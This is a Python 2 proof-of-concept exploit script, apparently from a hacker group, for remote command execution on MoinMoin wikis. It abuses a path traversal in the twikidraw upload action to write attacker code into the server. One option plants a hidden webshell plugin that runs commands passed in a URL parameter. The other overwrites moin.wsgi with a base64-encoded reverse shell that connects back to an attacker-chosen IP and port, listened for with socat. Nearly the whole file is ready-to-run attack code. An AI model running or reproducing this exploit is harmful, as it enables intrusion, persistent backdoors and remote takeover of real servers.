#!/usr/bin/env python
# -*- coding: utf-8 -*-
 
ascii = '\x1b[1;31m'###########################################################################
ascii +='                                                                                \r\n'#
ascii +=' ..........    ......   ...  ...  ...    ..........   ........  ...     ....... \r\n'#
ascii +=' ...........  ........  ...  .... ...    ...........  ........  ...     ....... \r\n'#
ascii +=' ... ... ...  ...  ...  ...  ........    ... ... ...  ...       ...       ...   \r\n'#
ascii +=' ... ... ...  ...  ...  ...  ........    ... ... ...  ...       ...       ...   \r\n'#
ascii +=' ... ... ...  ...  ...  ...  ... ....    ... ... ...  ......    ...       ...   \r\n'#
ascii +=' ...   . ...  ...  ...  ...  ...  ...    ...   . ...  ......    ...       ...   \r\n'#
ascii +=' ...     ...  ...  ...  ...  ...  ...    ...     ...  ...       ...       ...   \r\n'#
ascii +=' ...     ...  ...  ...  ...  ...  ...    ...     ...  ...        ...      ...   \r\n'#
ascii +=' ...     ..   ..... ..   ..   ..   ..    ...     ..    .. ....   .. ....   ..   \r\n'#
ascii +='  .      .     . .  .   .    ..    .      .      .    . .. ..   . .. . .   .    \r\n'#
ascii +='                                                                                \r\n'#
ascii +='        ~[  PoC v2 : Remote arbitrary command execution for MoinMoin  ]~        \r\n'#
ascii +='\x1b[0m'##############################################################################
 
# V1: Stealth webshell, available upon Apache restart (24H)
# V2: Update stealth webshell, backconnect shell, available immediately (RISKY); Login functionality
# ToDo: Handle TextCha's, spoof UA
#
# Usage:     python moinmelt.py
# Requires: `requests` module, socat
#
# cr3dz: [HTP], Unnamed
 
import requests, re, getpass, random
 
print ascii
print "[*] Now with", random.choice(["hookers",
                                     "SYN floods",
                                     "integrated LOIC",
                                     "a bullshit Reason Generator",
                                     "UDP floods",
                                     "an admin informer",
                                     "a backdoor",
                                     "automatic defacing",
                                     "Full Disclosure letters",
                                     "advertisements",
                                     "an End-User License Agreement",
                                     "a 30-day Trial",
                                     "a free AOL subscription",
                                     "more educational value",
                                     "famewhoring",
                                     "Havij support",
                                     "advice from Sabu",
                                     "incomprehensible commentary",
                                     "hacker apparel",
                                     "advice from Kevin Mitnick",
                                     "a Unity applet",
                                     "JUSTICE",
                                     "FreeNode support",
                                     "advice from Chippy1337"]) + "!"
 
target = raw_input("[*] Target site? ").replace("http://","").replace("FrontPage","").replace("WikiSandBox","")
print "[*] Method of execution:"
print "[1] Stealth webshell, available upon Apache restart (24H)"
print "[2] Backconnect shell, available immediately (RISKY)"
print "[3] Exit"
method = raw_input("> ")
 
if method=='3':
    exit()
elif method=='2':
    print "[*] Preparing exploit.."
    filename = 'drawing.r if()else[]\nexec eval("open(__file__)\\56read()\\56split(\'[MARK]\')[-2]\\56strip(\'\\\\0\')")'
    data = """IyAtKi0gY29kaW5nOiBpc28tODg1OS0xIC0qLQoKaW1wb3J0IHN5cywgb3MsIHNvY2tldCwgcHR5
              LCBzZWxlY3QKcHdkID0gb3MucGF0aC5kaXJuYW1lKF9fZmlsZV9fKQpzeXMucGF0aC5pbnNlcnQo
              MCwgcHdkKQoKZGVmIG1vaW5tZWx0c2hlbGwoaG9zdCxwb3J0KToKICAgIHNvY2sgPSBzb2NrZXQu
              c29ja2V0KCkKICAgIHRyeToKICAgICAgICBzb2NrLmNvbm5lY3QoKGhvc3QsIGludChwb3J0KSkp
              CiAgICBleGNlcHQ6CiAgICAgICAgcmV0dXJuCiAgICBwaWQsIGNoaWxkUHJvY2VzcyA9IHB0eS5m
              b3JrKCkKICAgIGlmIHBpZCA9PSAwOgogICAgICAgIHNvY2suc2VuZCgiW35dIFx4MWJbMTszMW1N
              b2luTWVsdCBSZXZlcnNlIFNoZWxsXHgxYlswbVxyXG4iKQogICAgICAgIG9zLnB1dGVudigiSElT
              VEZJTEUiLCIvZGV2L251bGwiKQogICAgICAgIG9zLnB1dGVudigiUFdEIiwgcHdkKQogICAgICAg
              IG9zLnB1dGVudigiSE9NRSIsIG9zLmdldGN3ZCgpKQogICAgICAgIG9zLnB1dGVudigiUEFUSCIs
              Jy91c3IvbG9jYWwvc2JpbjovdXNyL3NiaW46L3NiaW46Jytvcy5nZXRlbnYoJ1BBVEgnKSkKICAg
              ICAgICBvcy5wdXRlbnYoIlRFUk0iLCdsaW51eCcpCiAgICAgICAgb3MucHV0ZW52KCJQUzEiLCdc
              eDFiWzE7MzFtXFx1QFxcaDpcXHdcXCQgXHgxYlswbScpCiAgICAgICAgcHR5LnNwYXduKCIvYmlu
              L2Jhc2giKQogICAgICAgIHNvY2suc2VuZCgiXHJcbiIpCiAgICAgICAgc29jay5zaHV0ZG93bigx
              KQogICAgZWxzZToKICAgICAgICBiID0gc29jay5tYWtlZmlsZShvcy5PX1JET05MWXxvcy5PX05P
              TkJMT0NLKQogICAgICAgIGMgPSBvcy5mZG9wZW4oY2hpbGRQcm9jZXNzLCdyKycpCiAgICAgICAg
              eSA9IHtiOmMsYzpifQogICAgICAgIHRyeToKICAgICAgICAgICAgd2hpbGUgVHJ1ZToKICAgICAg
              ICAgICAgICAgIGZvciBuIGluIHNlbGVjdC5zZWxlY3QoW2IsY10sW10sW10pWzBdOgogICAgICAg
              ICAgICAgICAgICAgIHogPSBvcy5yZWFkKG4uZmlsZW5vKCksNDA5NikKICAgICAgICAgICAgICAg
              ICAgICB5W25dLndyaXRlKHopCiAgICAgICAgICAgICAgICAgICAgeVtuXS5mbHVzaCgpCiAgICAg
              ICAgZXhjZXB0OgogICAgICAgICAgICBwYXNzCgp0cnk6CiAgICBwaWQgPSBvcy5mb3JrKCkKICAg
              IGlmIG5vdCBwaWQ6IG1vaW5tZWx0c2hlbGwoJ1tJUF0nLCAnW1BPUlRdJykKZXhjZXB0OgogICAg
              cGFzcyAjIEF2b2lkIGludGVybmFsIHNlcnZlciBlcnJvcnMKCmZyb20gTW9pbk1vaW4ud2ViLnNl
              cnZpbmcgaW1wb3J0IG1ha2VfYXBwbGljYXRpb24KYXBwbGljYXRpb24gPSBtYWtlX2FwcGxpY2F0
              aW9uKHNoYXJlZD1UcnVlKQ==""".strip().decode("base64")
elif method=='1':
    print "[*] Preparing exploit.."
    filename = "drawing.r if()else[]\nimport os\ndef execute(p,r):exec\"print>>r,os\\56popen(r\\56values['c'])\\56read()\""
    data = "MoinMoin error\n"
else:
    print "[-] \x1b[0;31mInvalid method\x1b[0m"
    exit()
 
print "[*] Checking permissions on WikiSandBox page.."
username=None
password=None
authorizationcookie=None
jar=None
permission_check = requests.get("http://%s/WikiSandBox" % target).text
if "Edit (Text)" in permission_check:
    print "[+] No security"
    check = True
elif "Immutable Page" in permission_check:
    print "[-] Authorization required"
    check = False
else:
    print "[-] \x1b[0;31mCould not identify editable page!\x1b[0m"
    print "[-] Authorization required"
    check = False
if not check:
    have_acc = raw_input("[*] Do you have an account? [Y/N] ").lower()
    if have_acc.startswith("y"):
        username = raw_input("[*] Username: ")
        password = getpass.getpass("[*] Password: ")
    else:
        print "[-] \x1b[0;31mCreate an account and restart the exploitation process\x1b[0m"
        print "[-] http://%s/?action=newaccount" % target
    url = "http://%s/" % target
    print "[*] Logging in"
    signon = {'action':'login','name':username,'password':password,'login':'Login'}
    jar = requests.post(url, data=signon).cookies
    for cookie in jar.values():
        if len(cookie)==40:
            authorizationcookie=cookie
    if not authorizationcookie:
        print "[-] \x1b[0;31mLogin failed\x1b[0m"
        exit()
    else:
        print "[+] Login succeeded"
    permission_check2 = requests.get("http://%s/WikiSandBox" % target).text
"""
    if "Edit (Text)" in permission_check2:
        print "[+] Successfully authorized to edit pages"
    elif "Immutable Page" in permission_check:
        print "[-] \x1b[0;31mFailed authorization check\x1b[0m"
        exit()
    else:
        print "[?] \x1b[0;33mLost track of environment.. continuing anyway\x1b[0m"
        exit()
"""
 
print "[*] Obtaining ticket credentials to write backdoor.."
if method == '1':
    ticket = requests.get("http://%s/WikiSandBox?action=twikidraw&do=modify&target=../../../plugin/action/moinexec.py" % target, cookies=jar)
elif method == '2':
    ticket = requests.get("http://%s/WikiSandBox?action=twikidraw&do=modify&target=../../../../moin.wsgi" % target, cookies=jar)
m = re.search('ticket=(.*?)&target', ticket.text)
try:
    ticket_hash = m.group(1)
    print "[+] Extracted ticket hash from MoinMoin: %s" % (ticket_hash)
except:
    print "[-] \x1b[0;31mFailed to extract ticket hash from MoinMoin!\x1b[0m"
    exit()
 
print "[*] Sending payload.."
if method == '1':
    url = "http://%s/WikiSandBox?action=twikidraw&do=save&ticket=%s&target=../../../plugin/action/moinexec.py" % (target, ticket_hash)
    b = []
    b.append("\r\n--89692781418184")
    b.append("Content-Disposition: form-data; name=\"filename\"\r\n\r\n%s" % (filename))
    b.append("--89692781418184")
    b.append("Content-Disposition: form-data; name=\"filepath\"; filename=\"drawing.png\"")
    b.append("Content-Type: image/png\r\n")
    b.append(data)
    b.append("--89692781418184--")
    body = "\r\n".join(b)
    headers = {}
    headers['Content-Type'] = 'multipart/form-data; boundary=89692781418184'
    r = requests.post(url, cookies=jar, data=body, headers=headers)
    if(r.text == ""):
        print "[+] Exploit completed"
        print "[*] Upon Apache restart, your shell will be available at:"
        print "http://%s/WikiSandBox?action=moinexec&c=[command]" % target
    else:
        print "[-] \x1b[0;31mExploit failed\x1b[0m"
elif method == '2':
    print "[*] Backconnect options:"
    ip   = raw_input("[*] IP? ")
    port = raw_input("[*] Port? ")
    print "[*] To recieve your shell, login to %s and run: socat file:`tty`,raw,echo=0 tcp4-listen:%s" % (ip,port)
    raw_input("[*] Press enter to continue ")
    payload = "[MARK]exec \"%s\".decode(\"base64\")[MARK]\n" % data.replace("[IP]",ip).replace("[PORT]",port).encode("base64").replace("\n","")
    url = "http://%s/WikiSandBox?action=twikidraw&do=save&ticket=%s&target=../../../../moin.wsgi" % (target, ticket_hash)
    b = []
    b.append("\r\n--89692781418184")
    b.append("Content-Disposition: form-data; name=\"filename\"\r\n\r\n%s" % (filename))
    b.append("--89692781418184")
    b.append("Content-Disposition: form-data; name=\"filepath\"; filename=\"drawing.png\"")
    b.append("Content-Type: image/png\r\n")
    b.append(payload)
    b.append("--89692781418184--")
    body = "\r\n".join(b)
    headers = {}
    headers['Content-Type'] = 'multipart/form-data; boundary=89692781418184'
    r = requests.post(url, cookies=jar, data=body, headers=headers)
    if(r.text == ""):
        print "[+] Payload file written"
    else:
        print "[-] \x1b[0;31mExploit failed\x1b[0m"
        exit()
    print "[*] Sending reverse shell"
    result = requests.get("http://%s/WikiSandBox?action=AttachFile" % target, cookies=jar).text
    if "Internal Server Error" in result or "Traceback" in result:
        print "[-] \x1b[0;31mSHIT\x1b[0m"
    else:
        print "[+] Shell sent successfully"
 
# American: How the fuck did you get in here?
# Lone Man: I used my imagination.
